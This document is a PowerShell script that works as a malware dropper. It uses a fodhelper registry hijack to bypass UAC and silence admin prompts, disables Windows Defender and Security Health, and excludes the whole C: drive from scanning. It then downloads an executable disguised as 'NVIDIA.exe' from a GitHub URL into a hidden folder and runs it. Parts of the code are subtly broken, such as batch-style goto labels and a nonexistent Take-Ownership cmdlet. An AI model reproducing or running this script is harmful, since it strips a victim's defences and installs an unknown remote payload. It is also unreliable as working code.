$ProcessorArchitecture = $env:PROCESSOR_ARCHITECTURE
if ($ProcessorArchitecture -eq "amd64") {
    try {
        & "$env:SYSTEMROOT\SysWOW64\cacls.exe" "$env:SYSTEMROOT\SysWOW64\config\system" > $null 2>&1
    } catch {
        goto UACPrompt
    }
} else {
    try {
        & "$env:SYSTEMROOT\system32\cacls.exe" "$env:SYSTEMROOT\system32\config\system" > $null 2>&1
    } catch {
        goto UACPrompt
    }
}

if ($LASTEXITCODE -ne 0) {
    goto UACPrompt
} else {
    goto gotAdmin
}

# UACPrompt - PowerShell equivalent of elevating privileges
:UACPrompt
# Perform registry changes first
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" -Force
Set-ItemProperty -Path "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value " " -Force

# Run fodhelper.exe
Start-Process "fodhelper.exe"

# Elevate the script to administrator
$scriptPath = "$env:TEMP\getadmin.ps1"
$command = 'Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File ''$scriptPath''" -Verb runAs'
Set-Content -Path $scriptPath -Value @"
$command
"@
Invoke-Expression -Command $command

# gotAdmin
:gotAdmin
Push-Location
Set-Location -Path (Split-Path -Parent $MyInvocation.MyCommand.Path)

# Disable Windows Defender Real-Time Protection
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force

# Delete SecurityHealth entry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -Force

# Take ownership and rename files
Take-Ownership "C:\Windows\System32\SecurityHealthService.exe"
Set-ItemProperty -Path "C:\Windows\System32\SecurityHealthService.exe" -Name "name" -Value "Celka.sej"
Take-Ownership "C:\Windows\System32\SecurityHealthSystray.exe"
Set-ItemProperty -Path "C:\Windows\System32\SecurityHealthSystray.exe" -Name "name" -Value "Nurik.nes"

# Kill task
Stop-Process -Name "SecurityHealthSystray" -Force

# Exclusion for Windows Defender
Add-MpPreference -ExclusionPath "C:\"

# Create hidden folder and download file
New-Item -Path "C:\ProgramData\QQQ" -ItemType Directory
Set-ItemProperty -Path "C:\ProgramData\QQQ" -Name "Hidden" -Value $true
Invoke-WebRequest -Uri "https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIA.exe" -OutFile "C:\ProgramData\QQQ\NVIDIA.exe"

# Start downloaded executable
Start-Process -FilePath "C:\ProgramData\QQQ\NVIDIA.exe"
